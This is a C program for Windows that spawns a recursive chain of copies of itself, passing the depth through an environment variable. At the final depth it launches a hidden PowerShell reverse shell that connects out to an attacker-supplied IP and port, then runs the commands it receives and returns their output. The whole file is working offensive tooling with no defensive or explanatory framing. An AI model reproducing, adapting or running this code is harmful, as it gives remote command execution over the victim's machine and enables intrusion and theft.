#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DEPTH_ENV "RECURSIVE_DEPTH"

int get_depth();
void spawn_recursive(int depth, const char *exe_path, int max_depth, int sleep_ms, const char *ip, const char *port);
void launch_powershell_payload(const char *ip, const char *port);

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <max_depth> <sleep_ms> <ip> <port>\n", argv[0]);
        return 1;
    }

    int max_depth = atoi(argv[1]);
    int sleep_ms = atoi(argv[2]);
    const char *ip = argv[3];
    const char *port = argv[4];

    int depth = get_depth();

    if (depth >= max_depth) {
        launch_powershell_payload(ip, port);
        return 0;
    }

    // Get path to current executable
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    spawn_recursive(depth, exe_path, max_depth, sleep_ms, ip, port);

    Sleep(sleep_ms);
    return 0;
}

int get_depth() {
    char *env = getenv(DEPTH_ENV);
    return env ? atoi(env) : 0;
}

void spawn_recursive(int depth, const char *exe_path, int max_depth, int sleep_ms, const char *ip, const char *port) {
    // Set updated depth in environment
    char new_depth[16];
    sprintf(new_depth, "%d", depth + 1);
    SetEnvironmentVariableA(DEPTH_ENV, new_depth);

    // Build command line for child
    char cmdline[512];
    snprintf(cmdline, sizeof(cmdline), "\"%s\" %d %d %s %s", exe_path, max_depth, sleep_ms, ip, port);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed at depth %d. Error: %lu\n", depth, GetLastError());
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("Finished depth %d\n", depth);
}

void launch_powershell_payload(const char *ip, const char *port) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "cmd.exe /C powershell.exe -nop -w hidden -Command "
        "\"$c=New-Object Net.Sockets.TCPClient('%s',%s);"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);"
        "$sb2=$sb+'PS '+(pwd).Path+'> ';"
        "$o=([text.encoding]::ASCII).GetBytes($sb2);"
        "$s.Write($o,0,$o.Length);$s.Flush()};$c.Close()\"",
        ip, port);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("Failed to launch PowerShell reverse shell. Error: %lu\n", GetLastError());
        return;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
